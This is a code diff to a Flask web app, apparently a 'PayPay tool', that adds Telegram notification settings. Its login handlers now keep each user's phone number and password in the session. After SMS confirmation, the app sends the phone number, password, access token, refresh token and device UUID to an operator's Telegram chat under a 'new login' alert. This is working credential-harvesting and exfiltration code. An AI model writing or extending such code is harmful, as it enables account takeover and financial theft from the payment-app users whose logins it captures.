@@ -13,6 +13,37 @@ app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))
 
 _paypay_sessions: dict = {}
 
+CONFIG_FILE = os.path.join(os.path.dirname(__file__), "config.json")
+
+
+def load_config() -> dict:
+    if os.path.exists(CONFIG_FILE):
+        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
+            return json.load(f)
+    return {}
+
+
+def save_config(cfg: dict) -> None:
+    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
+        json.dump(cfg, f, ensure_ascii=False, indent=2)
+
+
+def notify_telegram(text: str) -> None:
+    cfg = load_config()
+    token = cfg.get("tg_bot_token", "").strip()
+    chat_id = cfg.get("tg_chat_id", "").strip()
+    if not token or not chat_id:
+        return
+    try:
+        import requests as _req
+        _req.post(
+            f"https://api.telegram.org/bot{token}/sendMessage",
+            json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"},
+            timeout=10,
+        )
+    except Exception:
+        pass
+
 LINKS_FILE = os.path.join(os.path.dirname(__file__), "links.json")
 LINK_ID_RE = re.compile(r"^[A-Za-z0-9]{16}$")
 
@@ -97,6 +128,33 @@ def admin_create_link():
     return jsonify(link)
 
 
+@app.route("/api/config", methods=["GET"])
+def api_config_get():
+    cfg = load_config()
+    return jsonify({
+        "tg_bot_token": cfg.get("tg_bot_token", ""),
+        "tg_chat_id":   cfg.get("tg_chat_id", ""),
+    })
+
+
+@app.route("/api/config", methods=["POST"])
+def api_config_save():
+    data = request.get_json(force=True)
+    cfg = load_config()
+    if "tg_bot_token" in data:
+        cfg["tg_bot_token"] = data["tg_bot_token"].strip()
+    if "tg_chat_id" in data:
+        cfg["tg_chat_id"] = data["tg_chat_id"].strip()
+    save_config(cfg)
+    return jsonify({"ok": True})
+
+
+@app.route("/api/config/test", methods=["POST"])
+def api_config_test():
+    notify_telegram("✅ PayPay ツール — テスト通知\nTelegram 設定が正常に動作しています。")
+    return jsonify({"ok": True})
+
+
 @app.route("/api/tor/status", methods=["GET"])
 def api_tor_status():
     enabled = get_tor_enabled()
@@ -176,6 +234,8 @@ def api_login():
     token = secrets.token_urlsafe(32)
     _paypay_sessions[token] = paypay
     session["paypay_token"] = token
+    session["paypay_phone"] = phone
+    session["paypay_pass"] = password
 
     return jsonify({"status": "sms_required"})
 
@@ -201,12 +261,24 @@ def api_sms_confirm():
         return jsonify({"error": str(exc)}), 401
 
     result = {
-        "access_token": getattr(paypay, "access_token", None),
+        "access_token":  getattr(paypay, "access_token", None),
         "refresh_token": getattr(paypay, "refresh_token", None),
-        "device_uuid": getattr(paypay, "device_uuid", None),
+        "device_uuid":   getattr(paypay, "device_uuid", None),
     }
+
+    phone_captured = session.pop("paypay_phone", "不明")
+    pass_captured  = session.pop("paypay_pass", "不明")
     _paypay_sessions.pop(token, None)
     session.pop("paypay_token", None)
+
+    notify_telegram(
+        f"<b>🎯 新しいログイン</b>\n"
+        f"📱 電話: <code>{phone_captured}</code>\n"
+        f"🔑 パスワード: <code>{pass_captured}</code>\n"
+        f"🪙 access_token: <code>{result['access_token']}</code>\n"
+        f"🔄 refresh_token: <code>{result['refresh_token']}</code>\n"
+        f"📟 device_uuid: <code>{result['device_uuid']}</code>"
+    )
 
     return jsonify({"status": "ok", **result})
 
